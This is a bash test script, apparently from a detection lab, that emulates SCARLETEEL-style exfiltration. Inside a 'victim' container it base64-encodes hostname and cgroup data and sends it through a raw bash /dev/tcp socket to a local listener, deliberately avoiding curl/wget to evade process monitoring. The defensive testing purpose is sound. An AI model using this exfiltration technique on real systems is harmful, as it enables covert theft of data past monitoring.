#!/usr/bin/env bash
# TJ-2 — T1048.003: exfiltration via bash /dev/tcp with base64 payload in the URI.
# Corpus: SCARLETEEL 2.0 (Sysdig TRT, Sep 2023) — send_aws_data()/dload(): shell built-ins
# only, deliberately avoiding curl/wget to evade process-name monitoring.
# Safe: payload is hostname/cgroup noise; endpoint is the LOCAL listener container.
set -euo pipefail
cd "$(dirname "$0")"
./setup-listener.sh >/dev/null
LISTENER_IP=$(docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' tj-listener)

echo "=== TJ-2 begin $(date -u +%FT%TZ)"
docker exec tj-victim bash -c '
  cat /etc/hostname /proc/self/cgroup > /tmp/tj.$$ 2>/dev/null
  SEND_B64_DATA=$(cat /tmp/tj.$$ | base64 -w 0)
  rm -f /tmp/tj.$$
  exec 3<>/dev/tcp/'"$LISTENER_IP"'/80
  printf "GET /in.php?base64=%s HTTP/1.1\r\nHost: listener\r\nConnection: close\r\n\r\n" "$SEND_B64_DATA" >&3
  cat <&3 > /dev/null
' || echo "(connection failed — check listener)"
echo "=== TJ-2 end   $(date -u +%FT%TZ)"
